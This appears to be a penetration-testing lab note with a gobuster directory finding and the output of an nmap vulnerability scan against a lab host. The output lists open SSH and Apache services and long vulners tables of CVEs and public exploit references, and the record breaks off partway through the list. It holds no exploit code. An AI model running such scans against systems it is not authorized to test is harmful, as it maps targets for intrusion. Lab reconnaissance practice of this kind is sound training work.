gobuster found a /phmyadmin /javascript /blog /wordpress /index.html


┌──(kali㉿kali)-[~]
└─$ nmap -T4 -A --script vuln -p- -oN initial.nmap 10.10.217.97
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 10:55 EDT
Nmap scan report for 10.10.217.97
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A       *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23       *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623       *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC       *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    9.8     https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A       *EXPLOIT*
|       2227729D-6700-5C8F-8930-1EEAFD4B9FF0    9.8     https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0       *EXPLOIT*
|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587       *EXPLOIT*
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       PACKETSTORM:173661      7.5     https://vulners.com/packetstorm/PACKETSTORM:173661   *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    7.5     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807       *EXPLOIT*
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576     *EXPLOIT*
|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
|       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A       *EXPLOIT*
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283   *EXPLOIT*
|       F79E574D-30C8-5C52-A801-66FFA0610BAA    6.8     https://vulners.com/githubexploit/F79E574D-30C8-5C52-A801-66FFA0610BAA       *EXPLOIT*
|       EDB-ID:46516    6.8     https://vulners.com/exploitdb/EDB-ID:46516  *EXPLOIT*
|       EDB-ID:46193    6.8     https://vulners.com/exploitdb/EDB-ID:46193  *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       CVE-2019-6110   6.8     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   6.8     https://vulners.com/cve/CVE-2019-6109
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3       *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918     *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207       *EXPLOIT*
|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
|       PACKETSTORM:181223      5.9     https://vulners.com/packetstorm/PACKETSTORM:181223   *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        5.9     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-      *EXPLOIT*
|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6111   5.9     https://vulners.com/cve/CVE-2019-6111
|       54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C    5.9     https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C       *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19 *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 *EXPLOIT*
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328     *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009     *EXPLOIT*
|       EDB-ID:45939    5.3     https://vulners.com/exploitdb/EDB-ID:45939  *EXPLOIT*
|       EDB-ID:45233    5.3     https://vulners.com/exploitdb/EDB-ID:45233  *EXPLOIT*
|       CVE-2018-20685  5.3     https://vulners.com/cve/CVE-2018-20685
|       CVE-2018-15919  5.3     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.3     https://vulners.com/cve/CVE-2018-15473
|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621   *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0 *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283 *EXPLOIT*
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730     *EXPLOIT*
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227   *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261   *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937     *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E       *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A       *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114   *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE- *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH- *EXPLOIT*
|       HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6  9.8     https://vulners.com/httpd/HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6
|       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
|       HTTPD:A1BBCE110E077FFBF4469D4F06DB9293  9.8     https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
|       HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D  9.8     https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
|       HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8  9.8     https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
|       HTTPD:9AD76A782F4E66676719E36B64777A7A  9.8     https://vulners.com/httpd/HTTPD:9AD76A782F4E66676719E36B64777A7A
|       HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E  9.8     https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
|       F9C0CD4B-3B60-5720-AE7A-7CC31DB839C5    9.8     https://vulners.com/githubexploit/F9C0CD4B-3B60-5720-AE7A-7CC31DB839C5       *EXPLOIT*
|       F607361B-6369-5DF5-9B29-E90FA29DC565    9.8     https://vulners.com/githubexploit/F607361B-6369-5DF5-9B29-E90FA29DC565       *EXPLOIT*
|       F41EE867-4E63-5259-9DF0-745881884D04    9.8     https://vulners.com/githubexploit/F41EE867-4E63-5259-9DF0-745881884D04       *EXPLOIT*
|       EDB-ID:51193    9.8     https://vulners.com/exploitdb/EDB-ID:51193  *EXPLOIT*
|       EDB-ID:50512    9.8     https://vulners.com/exploitdb/EDB-ID:50512  *EXPLOIT*
|       EDB-ID:50446    9.8     https://vulners.com/exploitdb/EDB-ID:50446  *EXPLOIT*
|       EDB-ID:50406    9.8     https://vulners.com/exploitdb/EDB-ID:50406  *EXPLOIT*
|       E796A40A-8A8E-59D1-93FB-78EF4D8B7FA6    9.8     https://vulners.com/githubexploit/E796A40A-8A8E-59D1-93FB-78EF4D8B7FA6       *EXPLOIT*
|       D10426F3-DF82-5439-AC3E-6CA0A1365A09    9.8     https://vulners.com/githubexploit/D10426F3-DF82-5439-AC3E-6CA0A1365A09       *EXPLOIT*
|       D0368327-F989-5557-A5C6-0D9ACDB4E72F    9.8     https://vulners.com/githubexploit/D0368327-F989-5557-A5C6-0D9ACDB4E72F       *EXPLOIT*
|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  9.8     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  9.8     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-42013  9.8     https://vulners.com/cve/CVE-2021-42013
|       CVE-2021-39275  9.8     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  9.8     https://vulners.com/cve/CVE-2021-26691
|       CVE-2018-1312   9.8     https://vulners.com/cve/CVE-2018-1312
|       CNVD-2022-51061 9.8     https://vulners.com/cnvd/CNVD-2022-51061
|       CNVD-2022-03225 9.8     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        9.8     https://vulners.com/cnvd/CNVD-2021-102386
|       CC15AE65-B697-525A-AF4B-38B1501CAB49    9.8     https://vulners.com/githubexploit/CC15AE65-B697-525A-AF4B-38B1501CAB49       *EXPLOIT*
|       C879EE66-6B75-5EC8-AA68-08693C6CCAD1    9.8     https://vulners.com/githubexploit/C879EE66-6B75-5EC8-AA68-08693C6CCAD1       *EXPLOIT*
|       C5A61CC6-919E-58B4-8FBB-0198654A7FC8    9.8     https://vulners.com/githubexploit/C5A61CC6-919E-58B4-8FBB-0198654A7FC8       *EXPLOIT*
|       BF9B0898-784E-5B5E-9505-430B58C1E6B8    9.8     https://vulners.com/githubexploit/BF9B0898-784E-5B5E-9505-430B58C1E6B8       *EXPLOIT*
|       B02819DB-1481-56C4-BD09-6B4574297109    9.8     https://vulners.com/githubexploit/B02819DB-1481-56C4-BD09-6B4574297109       *EXPLOIT*
|       ACD5A7F2-FDB2-5859-8D23-3266A1AF6795    9.8     https://vulners.com/githubexploit/ACD5A7F2-FDB2-5859-8D23-3266A1AF6795       *EXPLOIT*
|       A90ABEAD-13A8-5F09-8A19-6D9D2D804F05    9.8     https://vulners.com/githubexploit/A90ABEAD-13A8-5F09-8A19-6D9D2D804F05       *EXPLOIT*
|       A8616E5E-04F8-56D8-ACB4-32FDF7F66EED    9.8     https://vulners.com/githubexploit/A8616E5E-04F8-56D8-ACB4-32FDF7F66EED       *EXPLOIT*
|       A5425A79-9D81-513A-9CC5-549D6321897C    9.8     https://vulners.com/githubexploit/A5425A79-9D81-513A-9CC5-549D6321897C       *EXPLOIT*
|       A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A    9.8     https://vulners.com/githubexploit/A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A       *EXPLOIT*
|       9B4F4E4A-CFDF-5847-805F-C0BAE809DBD5    9.8     https://vulners.com/githubexploit/9B4F4E4A-CFDF-5847-805F-C0BAE809DBD5       *EXPLOIT*
|       907F28D0-5906-51C7-BAA3-FEBD5E878801    9.8     https://vulners.com/githubexploit/907F28D0-5906-51C7-BAA3-FEBD5E878801       *EXPLOIT*
|       8A57FAF6-FC91-52D1-84E0-4CBBAD3F9677    9.8     https://vulners.com/githubexploit/8A57FAF6-FC91-52D1-84E0-4CBBAD3F9677       *EXPLOIT*
|       88EB009A-EEFF-52B7-811D-A8A8C8DE8C81    9.8     https://vulners.com/githubexploit/88EB009A-EEFF-52B7-811D-A8A8C8DE8C81       *EXPLOIT*
|       8713FD59-264B-5FD7-8429-3251AB5AB3B8    9.8     https://vulners.com/githubexploit/8713FD59-264B-5FD7-8429-3251AB5AB3B8       *EXPLOIT*
|       866E26E3-759B-526D-ABB5-206B2A1AC3EE    9.8     https://vulners.com/githubexploit/866E26E3-759B-526D-ABB5-206B2A1AC3EE       *EXPLOIT*
|       86360765-0B1A-5D73-A805-BAE8F1B5D16D    9.8     https://vulners.com/githubexploit/86360765-0B1A-5D73-A805-BAE8F1B5D16D       *EXPLOIT*
|       831E1114-13D1-54EF-BDE4-F655114CDC29    9.8     https://vulners.com/githubexploit/831E1114-13D1-54EF-BDE4-F655114CDC29       *EXPLOIT*
|       805E6B24-8DF9-51D8-8DF6-6658161F96EA    9.8     https://vulners.com/githubexploit/805E6B24-8DF9-51D8-8DF6-6658161F96EA       *EXPLOIT*
|       7E615961-3792-5896-94FA-1F9D494ACB36    9.8     https://vulners.com/githubexploit/7E615961-3792-5896-94FA-1F9D494ACB36       *EXPLOIT*
|       78787F63-0356-51EC-B32A-B9BD114431C3    9.8     https://vulners.com/githubexploit/78787F63-0356-51EC-B32A-B9BD114431C3       *EXPLOIT*
|       6CAA7558-723B-5286-9840-4DF4EB48E0AF    9.8     https://vulners.com/githubexploit/6CAA7558-723B-5286-9840-4DF4EB48E0AF       *EXPLOIT*
|       6A0A657E-8300-5312-99CE-E11F460B1DBF    9.8     https://vulners.com/githubexploit/6A0A657E-8300-5312-99CE-E11F460B1DBF       *EXPLOIT*
|       64D31BF1-F977-51EC-AB1C-6693CA6B58F3    9.8     https://vulners.com/githubexploit/64D31BF1-F977-51EC-AB1C-6693CA6B58F3       *EXPLOIT*
|       61075B23-F713-537A-9B84-7EB9B96CF228    9.8     https://vulners.com/githubexploit/61075B23-F713-537A-9B84-7EB9B96CF228       *EXPLOIT*
|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9       *EXPLOIT*
|       5312D04F-9490-5472-84FA-86B3BBDC8928    9.8     https://vulners.com/githubexploit/5312D04F-9490-5472-84FA-86B3BBDC8928       *EXPLOIT*
|       52E13088-9643-5E81-B0A0-B7478BCF1F2C    9.8     https://vulners.com/githubexploit/52E13088-9643-5E81-B0A0-B7478BCF1F2C       *EXPLOIT*
|       50453CEF-5DCF-511A-ADAC-FB74994CD682    9.8     https://vulners.com/githubexploit/50453CEF-5DCF-511A-ADAC-FB74994CD682       *EXPLOIT*
|       495E99E5-C1B0-52C1-9218-384D04161BE4    9.8     https://vulners.com/githubexploit/495E99E5-C1B0-52C1-9218-384D04161BE4       *EXPLOIT*
|       44E43BB7-6255-58E7-99C7-C3B84645D497    9.8     https://vulners.com/githubexploit/44E43BB7-6255-58E7-99C7-C3B84645D497       *EXPLOIT*
|       40F21EB4-9EE8-5ED1-B561-0A2B8625EED3    9.8     https://vulners.com/githubexploit/40F21EB4-9EE8-5ED1-B561-0A2B8625EED3       *EXPLOIT*
|       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B       *EXPLOIT*
|       37634050-FDDF-571A-90BB-C8109824B38D    9.8     https://vulners.com/githubexploit/37634050-FDDF-571A-90BB-C8109824B38D       *EXPLOIT*
|       30293CDA-FDB1-5FAF-9622-88427267F204    9.8     https://vulners.com/githubexploit/30293CDA-FDB1-5FAF-9622-88427267F204       *EXPLOIT*
|       2B3110E1-BEA0-5DB8-93AD-1682230F3E19    9.8     https://vulners.com/githubexploit/2B3110E1-BEA0-5DB8-93AD-1682230F3E19       *EXPLOIT*
|       22DCCD26-B68C-5905-BAC2-71D10DE3F123    9.8     https://vulners.com/githubexploit/22DCCD26-B68C-5905-BAC2-71D10DE3F123       *EXPLOIT*
|       2108729F-1E99-54EF-9A4B-47299FD89FF2    9.8     https://vulners.com/githubexploit/2108729F-1E99-54EF-9A4B-47299FD89FF2       *EXPLOIT*
|       1C39E10A-4A38-5228-8334-2A5F8AAB7FC3    9.8     https://vulners.com/githubexploit/1C39E10A-4A38-5228-8334-2A5F8AAB7FC3       *EXPLOIT*
|       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214     *EXPLOIT*
|       1337DAY-ID-37777        9.8     https://vulners.com/zdt/1337DAY-ID-37777     *EXPLOIT*
|       1337DAY-ID-36952        9.8     https://vulners.com/zdt/1337DAY-ID-36952     *EXPLOIT*
|       11813536-2AFF-5EA4-B09F-E9EB340DDD26    9.8     https://vulners.com/githubexploit/11813536-2AFF-5EA4-B09F-E9EB340DDD26       *EXPLOIT*
|       0C47BCF2-EA6F-5613-A6E8-B707D64155DE    9.8     https://vulners.com/githubexploit/0C47BCF2-EA6F-5613-A6E8-B707D64155DE       *EXPLOIT*
|       0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56    9.8     https://vulners.com/githubexploit/0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56       *EXPLOIT*
|       07AA70EA-C34E-5F66-9510-7C265093992A    9.8     https://vulners.com/githubexploit/07AA70EA-C34E-5F66-9510-7C265093992A       *EXPLOIT*
|       HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6  9.1     https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
|       HTTPD:3512E3F62E72F03B59F5E9CF8ECB3EEF  9.1     https://vulners.com/httpd/HTTPD:3512E3F62E72F03B59F5E9CF8ECB3EEF
|       HTTPD:2C227652EE0B3B961706AAFCACA3D1E1  9.1     https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
|       CVE-2022-28615  9.1     https://vulners.com/cve/CVE-2022-28615
|       CVE-2022-22721  9.1     https://vulners.com/cve/CVE-2022-22721
|       CVE-2019-10082  9.1     https://vulners.com/cve/CVE-2019-10082
|       CNVD-2022-51060 9.1     https://vulners.com/cnvd/CNVD-2022-51060
|       CNVD-2022-41638 9.1     https://vulners.com/cnvd/CNVD-2022-41638
|       2EF14600-503F-53AF-BA24-683481265D30    9.1     https://vulners.com/githubexploit/2EF14600-503F-53AF-BA24-683481265D30       *EXPLOIT*
|       0486EBEE-F207-570A-9AD8-33269E72220A    9.1     https://vulners.com/githubexploit/0486EBEE-F207-570A-9AD8-33269E72220A       *EXPLOIT*
|       HTTPD:1B3D546A8500818AAC5B1359FE11A7E4  9.0     https://vulners.com/httpd/HTTPD:1B3D546A8500818AAC5B1359FE11A7E4
|       DC06B9EF-3584-5D80-9EEB-E7B637DCF3D6    9.0     https://vulners.com/githubexploit/DC06B9EF-3584-5D80-9EEB-E7B637DCF3D6       *EXPLOIT*
|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
|       CVE-2021-40438  9.0     https://vulners.com/cve/CVE-2021-40438
|       CNVD-2022-03224 9.0     https://vulners.com/cnvd/CNVD-2022-03224
|       AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C    9.0     https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C       *EXPLOIT*
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    9.0     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2       *EXPLOIT*
|       893DFD44-40B5-5469-AC54-A373AEE17F19    9.0     https://vulners.com/githubexploit/893DFD44-40B5-5469-AC54-A373AEE17F19       *EXPLOIT*
|       7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2    9.0     https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2       *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    9.0     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332       *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    9.0     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B       *EXPLOIT*
|       36618CA8-9316-59CA-B748-82F15F407C4F    9.0     https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F       *EXPLOIT*
|       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91       *EXPLOIT*
|       HTTPD:A7133572D328CD65C350E33F20834FAD  8.2     https://vulners.com/httpd/HTTPD:A7133572D328CD65C350E33F20834FAD
|       CVE-2021-44224  8.2     https://vulners.com/cve/CVE-2021-44224
|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38       *EXPLOIT*
|       HTTPD:B63E69E936F944F114293D6F4AB8D4D6  8.1     https://vulners.com/httpd/HTTPD:B63E69E936F944F114293D6F4AB8D4D6
|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
|       CVE-2017-15715  8.1     https://vulners.com/cve/CVE-2017-15715
|       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1       *EXPLOIT*
|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5       *EXPLOIT*
|       HTTPD:4CB68AD1C4AC4E8EE009A960A68B7E65  7.8     https://vulners.com/httpd/HTTPD:4CB68AD1C4AC4E8EE009A960A68B7E65
|       EDB-ID:46676    7.8     https://vulners.com/exploitdb/EDB-ID:46676  *EXPLOIT*
|       CVE-2019-0211   7.8     https://vulners.com/cve/CVE-2019-0211
|       PACKETSTORM:176334      7.5     https://vulners.com/packetstorm/PACKETSTORM:176334   *EXPLOIT*
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631   *EXPLOIT*
|       PACKETSTORM:164941      7.5     https://vulners.com/packetstorm/PACKETSTORM:164941   *EXPLOIT*
|       PACKETSTORM:164629      7.5     https://vulners.com/packetstorm/PACKETSTORM:164629   *EXPLOIT*
|       PACKETSTORM:164609      7.5     https://vulners.com/packetstorm/PACKETSTORM:164609   *EXPLOIT*
|       HTTPD:F6C47B71D440F1A5B8EC9883D1516A33  7.5     https://vulners.com/httpd/HTTPD:F6C47B71D440F1A5B8EC9883D1516A33
|       HTTPD:F1CFBC9B54DFAD0499179863D36830BB  7.5     https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
|       HTTPD:D9B9375C40939357C5F47F1B3F64F0A1  7.5     https://vulners.com/httpd/HTTPD:D9B9375C40939357C5F47F1B3F64F0A1
|       HTTPD:D5C9AD5E120B9B567832B4A5DBD97F43  7.5     https://vulners.com/httpd/HTTPD:D5C9AD5E120B9B567832B4A5DBD97F43
|       HTTPD:CEEECD1BF3428B58C39137059390E4A1  7.5     https://vulners.com/httpd/HTTPD:CEEECD1BF3428B58C39137059390E4A1
|       HTTPD:C7D6319965E27EC08FB443D1FD67603B  7.5     https://vulners.com/httpd/HTTPD:C7D6319965E27EC08FB443D1FD67603B
|       HTTPD:C317C7138B4A8BBD54A901D6DDDCB837  7.5     https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
|       HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F  7.5     https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
|       HTTPD:B1B0A31C4AD388CC6C575931414173E2  7.5     https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
|       HTTPD:975FD708E753E143E7DFFC23510F802E  7.5     https://vulners.com/httpd/HTTPD:975FD708E753E143E7DFFC23510F802E
|       HTTPD:708DA551D11D790335A6621D3875C0F4  7.5     https://vulners.com/httpd/HTTPD:708DA551D11D790335A6621D3875C0F4
|       HTTPD:63F2722DB00DBB3F59C40B40F32363B3  7.5     https://vulners.com/httpd/HTTPD:63F2722DB00DBB3F59C40B40F32363B3
|       HTTPD:60420623F2A716909480F87DB74EE9D7  7.5     https://vulners.com/httpd/HTTPD:60420623F2A716909480F87DB74EE9D7
|       HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5  7.5     https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
|       HTTPD:109158785130C454EF1D1CDDD4417560  7.5     https://vulners.com/httpd/HTTPD:109158785130C454EF1D1CDDD4417560
|       HTTPD:05E6BF2AD317E3658D2938931207AA66  7.5     https://vulners.com/httpd/HTTPD:05E6BF2AD317E3658D2938931207AA66
|       FF610CB4-801A-5D1D-9AC9-ADFC287C8482    7.5     https://vulners.com/githubexploit/FF610CB4-801A-5D1D-9AC9-ADFC287C8482       *EXPLOIT*
|       FDF4BBB1-979C-5320-95EA-9EC7EB064D72    7.5     https://vulners.com/githubexploit/FDF4BBB1-979C-5320-95EA-9EC7EB064D72       *EXPLOIT*
|       FCAF01A0-F921-5DB1-BBC5-850EC2DC5C46    7.5     https://vulners.com/githubexploit/FCAF01A0-F921-5DB1-BBC5-850EC2DC5C46       *EXPLOIT*
|       F8A7DE57-8F14-5B3C-A102-D546BDD8D2B8    7.5     https://vulners.com/githubexploit/F8A7DE57-8F14-5B3C-A102-D546BDD8D2B8       *EXPLOIT*
|       F7F6E599-CEF4-5E03-8E10-FE18C4101E38    7.5     https://vulners.com/githubexploit/F7F6E599-CEF4-5E03-8E10-FE18C4101E38       *EXPLOIT*
|       EDB-ID:50383    7.5     https://vulners.com/exploitdb/EDB-ID:50383  *EXPLOIT*
|       E81474F6-6DDC-5FC2-828A-812A8815E3B4    7.5     https://vulners.com/githubexploit/E81474F6-6DDC-5FC2-828A-812A8815E3B4       *EXPLOIT*
|       E7B177F6-FA62-52FE-A108-4B8FC8112B7F    7.5     https://vulners.com/githubexploit/E7B177F6-FA62-52FE-A108-4B8FC8112B7F       *EXPLOIT*
|       E73E445F-0A0D-5966-8A21-C74FE9C0D2BC    7.5     https://vulners.com/githubexploit/E73E445F-0A0D-5966-8A21-C74FE9C0D2BC       *EXPLOIT*
|       E6B39247-8016-5007-B505-699F05FCA1B5    7.5     https://vulners.com/githubexploit/E6B39247-8016-5007-B505-699F05FCA1B5       *EXPLOIT*
|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    7.5     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89       *EXPLOIT*
|       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F       *EXPLOIT*
|       E59A01BE-8176-5F5E-BD32-D30B009CDBDA    7.5     https://vulners.com/githubexploit/E59A01BE-8176-5F5E-BD32-D30B009CDBDA       *EXPLOIT*
|       E0EEEDE5-43B8-5608-B33E-75E65D2D8314    7.5     https://vulners.com/githubexploit/E0EEEDE5-43B8-5608-B33E-75E65D2D8314       *EXPLOIT*
|       E-739   7.5     https://vulners.com/dsquare/E-739       *EXPLOIT*
|       E-738   7.5     https://vulners.com/dsquare/E-738       *EXPLOIT*
|       DBF996C3-DC2A-5859-B767-6B2FC38F2185    7.5     https://vulners.com/githubexploit/DBF996C3-DC2A-5859-B767-6B2FC38F2185       *EXPLOIT*
|       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A       *EXPLOIT*
|       D0E79214-C9E8-52BD-BC24-093970F5F34E    7.5     https://vulners.com/githubexploit/D0E79214-C9E8-52BD-BC24-093970F5F34E       *EXPLOIT*
